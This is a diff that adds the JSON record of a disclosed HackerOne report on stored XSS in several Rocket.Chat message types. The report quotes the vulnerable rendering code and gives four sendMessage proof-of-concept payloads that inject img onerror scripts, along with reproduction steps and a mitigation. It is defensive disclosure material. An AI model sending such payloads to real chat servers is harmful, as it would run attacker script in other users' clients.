@@ -1,0 +1,131 @@
+{
+  "id": 1379400,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzc5NDAw",
+  "url": "https://hackerone.com/reports/1379400",
+  "title": "XSS in various MessageTypes",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-10-23T19:43:08.054Z",
+  "submitted_at": "2021-10-23T19:43:08.122Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-08-10T21:55:12.427Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-11T21:55:09.407Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nRendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.\n\n## Description\n\nMessages in Rocket.Chat can have various types that influence the rendering as seen in [app/ui-message/client/message.js#L24-L53](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/ui-message/client/message.js#L24-L53):\n\n```javascript\nconst renderBody = (msg, settings) => {\n\tconst searchedText = msg.searchedText ? msg.searchedText : '';\n\tconst isSystemMessage = MessageTypes.isSystemMessage(msg);\n\tconst messageType = MessageTypes.getType(msg) || {};\n\n\tif (messageType.render) {\n\t\tmsg = messageType.render(msg);\n\t} else if (messageType.template) {\n\t\t// render template\n\t} else if (messageType.message) {\n\t\tmsg.msg = escapeHTML(msg.msg);\n\t\tmsg = TAPi18n.__(messageType.message, { ...typeof messageType.data === 'function' && messageType.data(msg) });\n\t} else if (msg.u && msg.u.username === settings.Chatops_Username) {\n\t\tmsg.html = msg.msg;\n\t\tmsg = renderMentions(msg);\n\t\tmsg = msg.html;\n\t} else {\n\t\tmsg = renderMessageBody(msg);\n\t}\n\n\tif (isSystemMessage) {\n\t\tmsg.html = Markdown.parse(msg.html);\n\t}\n\n\tif (searchedText) {\n\t\tmsg = msg.replace(new RegExp(searchedText, 'gi'), (str) => `<mark>${ str }</mark>`);\n\t}\n\n\treturn msg;\n};\n```\n\nThese MessageTypes are registered on startup of Rocket.Chat, like in this example the Message Snippeting Feature [app/message-snippet/client/messageType.js#L4-L16](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/message-snippet/client/messageType.js#L4-L16)\n\n```javascript\nimport { MessageTypes } from '../../ui-utils';\n\nMeteor.startup(function() {\n\tMessageTypes.registerType({\n\t\tid: 'message_snippeted',\n\t\tsystem: true,\n\t\tmessage: 'Snippeted_a_message',\n\t\tdata(message) {\n\t\t\tconst snippetLink = `<a href=\"/snippet/${ message.snippetId }/${ encodeURIComponent(message.snippetName) }\">${ escapeHTML(message.snippetName) }</a>`;\n\t\t\treturn { snippetLink };\n\t\t},\n\t});\n});\n```\n\nUnlike most other MessageTypes, not the messages sanitized `msg` parameter is rendered, but `snippetName` and `snippetId`. The unsanitized `message.snippetId` leads to arbitrary script execution in the client displaying a maliciously crafted message.\n\n```javascript\nMeteor.call(\"sendMessage\", {\n  rid: \"<ROOM_ID>\",\n  msg: \"\",\n  t: \"message_snippeted\",\n  snippetId: \"\\\"><img src=x onerror=alert(1) style=\\\"display: none;\\\" x=\\\"\",\n  snippetName: \"\"\n}, (...args) => console.log(...args));\n```\n\nAnother MessageTypes have been found to be affected similarly:\n\n```javascript\nMeteor.call(\"sendMessage\", {\n  rid: \"<ROOM_ID>\",\n  msg: \"\",\n  t: \"subscription-role-removed\",\n  role: \"<img src=x onerror=alert(1) />\"\n}, (...args) => console.log(...args));\n```\n\n```javascript\nMeteor.call(\"sendMessage\", {\n  rid: \"<ROOM_ID>\",\n  msg: \"\",\n  t: \"livechat_transfer_history\",\n  transferData: {\n    scope: \"agent\",\n    transferredTo: {\n      name: \"<img src=x onerror=alert(1) />\"\n    }\n  }\n}, (...args) => console.log(...args));\n```\n\n```javascript\nMeteor.call(\"sendMessage\", {\n  rid: \"<ROOM_ID>\",\n  msg: \"\",\n  t: \"omnichannel_placed_chat_on_hold\",\n  comment: \"<img src=x onerror=alert(1) />\"\n}, (...args) => console.log(...args));\n```\n\n## Releases Affected:\n\n  * 3.18.2\n  * 4.0.3\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n1.) Login to Rocket.Chat\n2.) Find any Room ID (window URL path from direct messages or avatar image path from channels)\n3.) Call `sendMessage` Meteor Method with `t` parameter and the affected source parameter\n\n## Suggested mitigation\n\n  * Sanitize message parameters rendered from MessageType `render` or `data` functions\n\n## Impact\n\nAuthenticated adversaries can craft messages that exploit XSS in the displaying frontend clients.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-08-10T21:55:09.545Z",
+  "allow_singular_disclosure_after": -55012109.34866213,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "loaymorad",
+    "zy9ard3",
+    "skeptiker",
+    "eminfidan",
+    "tronster",
+    "gitsjsons",
+    "09023268150",
+    "maverick1henry",
+    "vayunrix",
+    "billywaykins",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
